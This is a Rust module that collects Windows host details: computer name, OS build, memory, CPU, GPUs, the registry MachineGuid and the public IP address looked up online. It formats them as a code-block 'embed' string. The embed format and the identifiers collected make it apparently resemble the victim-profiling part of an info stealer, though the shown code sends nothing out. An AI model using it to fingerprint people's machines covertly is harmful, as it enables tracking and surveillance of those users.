use std::time::Duration;

#[derive(Clone)]
pub struct SystemInfo {
    pub computer_name: String,
    pub os_version: String,
    pub total_memory_gb: String,
    pub cpu_name: String,
    pub gpus: Vec<String>,
    pub uuid: String,
    pub ip_address: String,
}

impl SystemInfo {
    pub fn collect() -> Self {
        SystemInfo {
            computer_name: g_computer_name(),
            os_version: g_os_version(),
            total_memory_gb: g_total_memory(),
            cpu_name: g_cpu_name(),
            gpus: g_gpus(),
            uuid: g_machine_uuid(),
            ip_address: g_ip_address(),
        }
    }

    pub fn f_embed(&self) -> String {
        let gpu_str = if self.gpus.is_empty() {
            "Unknown".to_string()
        } else {
            self.gpus.join(", ")
        };

        format!(
            "```\nComputer : {}\nOS       : {}\nRAM      : {}\nCPU      : {}\nGPU      : {}\nUUID     : {}\nIP       : {}\n```",
            self.computer_name,
            self.os_version,
            self.total_memory_gb,
            self.cpu_name,
            gpu_str,
            self.uuid,
            self.ip_address,
        )
    }
}

fn g_computer_name() -> String {
    unsafe {
        let mut buf = [0u16; 256];
        let mut size = buf.len() as u32;

        #[link(name = "kernel32")]
        extern "system" {
            fn GetComputerNameW(lpBuffer: *mut u16, nSize: *mut u32) -> i32;
        }

        if GetComputerNameW(buf.as_mut_ptr(), &mut size) != 0 {
            String::from_utf16_lossy(&buf[..size as usize])
        } else {
            "Unknown".to_string()
        }
    }
}

fn g_os_version() -> String {
    #[repr(C)]
    struct OsVersionInfoExW {
        os_version_info_size: u32,
        major_version: u32,
        minor_version: u32,
        build_number: u32,
        platform_id: u32,
        sz_csd_version: [u16; 128],
        service_pack_major: u16,
        service_pack_minor: u16,
        suite_mask: u16,
        product_type: u8,
        reserved: u8,
    }

    unsafe {
        #[link(name = "ntdll")]
        extern "system" {
            fn RtlGetVersion(lpVersionInformation: *mut OsVersionInfoExW) -> i32;
        }

        let mut info: OsVersionInfoExW = std::mem::zeroed();
        info.os_version_info_size = std::mem::size_of::<OsVersionInfoExW>() as u32;

        if RtlGetVersion(&mut info) == 0 {
            let display_version = if info.major_version == 10 && info.build_number >= 22000 {
                "Windows 11"
            } else if info.major_version == 10 {
                "Windows 10"
            } else {
                "Windows"
            };

            format!("{} ({}.{}.{})", display_version, info.major_version, info.minor_version, info.build_number)
        } else {
            "Unknown".to_string()
        }
    }
}

fn g_total_memory() -> String {
    #[repr(C)]
    struct MemoryStatusEx {
        length: u32,
        memory_load: u32,
        total_phys: u64,
        avail_phys: u64,
        total_page_file: u64,
        avail_page_file: u64,
        total_virtual: u64,
        avail_virtual: u64,
        avail_extended_virtual: u64,
    }

    unsafe {
        #[link(name = "kernel32")]
        extern "system" {
            fn GlobalMemoryStatusEx(lpBuffer: *mut MemoryStatusEx) -> i32;
        }

        let mut status: MemoryStatusEx = std::mem::zeroed();
        status.length = std::mem::size_of::<MemoryStatusEx>() as u32;

        if GlobalMemoryStatusEx(&mut status) != 0 {
            let gb = status.total_phys as f64 / (1024.0 * 1024.0 * 1024.0);
            format!("{:.1} GB", gb)
        } else {
            "Unknown".to_string()
        }
    }
}

fn g_cpu_name() -> String {
    use windows::Win32::System::Registry::*;
    use windows::core::PCWSTR;

    unsafe {
        let subkey: Vec<u16> = "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0"
            .encode_utf16().collect();
        let value_name: Vec<u16> = "ProcessorNameString\0"
            .encode_utf16().collect();

        let mut hkey = HKEY::default();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(subkey.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        );

        if status.is_err() {
            return "Unknown".to_string();
        }

        let mut buf = [0u8; 512];
        let mut buf_len = buf.len() as u32;
        let mut reg_type = REG_VALUE_TYPE::default();

        let status = RegQueryValueExW(
            hkey,
            PCWSTR(value_name.as_ptr()),
            None,
            Some(&mut reg_type),
            Some(buf.as_mut_ptr()),
            Some(&mut buf_len),
        );

        let _ = RegCloseKey(hkey);

        if status.is_err() || buf_len == 0 {
            return "Unknown".to_string();
        }

        let wide: &[u16] = std::slice::from_raw_parts(
            buf.as_ptr() as *const u16,
            (buf_len as usize) / 2,
        );
        let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
        String::from_utf16_lossy(&wide[..len]).trim().to_string()
    }
}

fn g_gpus() -> Vec<String> {
    #[repr(C)]
    struct DisplayDeviceW {
        cb: u32,
        device_name: [u16; 32],
        device_string: [u16; 128],
        state_flags: u32,
        device_id: [u16; 128],
        device_key: [u16; 128],
    }

    unsafe {
        #[link(name = "user32")]
        extern "system" {
            fn EnumDisplayDevicesW(
                lpDevice: *const u16,
                iDevNum: u32,
                lpDisplayDevice: *mut DisplayDeviceW,
                dwFlags: u32,
            ) -> i32;
        }

        let mut gpus = Vec::new();
        let mut i = 0u32;

        loop {
            let mut dev: DisplayDeviceW = std::mem::zeroed();
            dev.cb = std::mem::size_of::<DisplayDeviceW>() as u32;

            if EnumDisplayDevicesW(std::ptr::null(), i, &mut dev, 0) == 0 {
                break;
            }

            let name_len = dev.device_string.iter().position(|&c| c == 0).unwrap_or(128);
            let name = String::from_utf16_lossy(&dev.device_string[..name_len]).trim().to_string();

            if !name.is_empty() && !gpus.contains(&name) {
                gpus.push(name);
            }

            i += 1;
            if i > 16 { break; }
        }

        gpus
    }
}

fn g_machine_uuid() -> String {
    use windows::Win32::System::Registry::*;
    use windows::core::PCWSTR;

    unsafe {
        let subkey: Vec<u16> = "SOFTWARE\\Microsoft\\Cryptography\0"
            .encode_utf16().collect();
        let value_name: Vec<u16> = "MachineGuid\0"
            .encode_utf16().collect();

        let mut hkey = HKEY::default();
        let status = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(subkey.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        );

        if status.is_err() {
            return "Unknown".to_string();
        }

        let mut buf = [0u8; 256];
        let mut buf_len = buf.len() as u32;
        let mut reg_type = REG_VALUE_TYPE::default();

        let status = RegQueryValueExW(
            hkey,
            PCWSTR(value_name.as_ptr()),
            None,
            Some(&mut reg_type),
            Some(buf.as_mut_ptr()),
            Some(&mut buf_len),
        );

        let _ = RegCloseKey(hkey);

        if status.is_err() || buf_len == 0 {
            return "Unknown".to_string();
        }

        let wide: &[u16] = std::slice::from_raw_parts(
            buf.as_ptr() as *const u16,
            (buf_len as usize) / 2,
        );
        let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
        String::from_utf16_lossy(&wide[..len]).trim().to_string()
    }
}

fn g_ip_address() -> String {
    let agent = ureq::builder()
        .timeout_connect(Duration::from_secs(5))
        .timeout(Duration::from_secs(5))
        .build();
    match agent.get("https://api.ipify.org?format=text").call() {
        Ok(resp) => resp
            .into_string()
            .unwrap_or_else(|_| "Unknown".to_string())
            .trim()
            .to_string(),
        Err(_) => "Unknown".to_string(),
    }
}
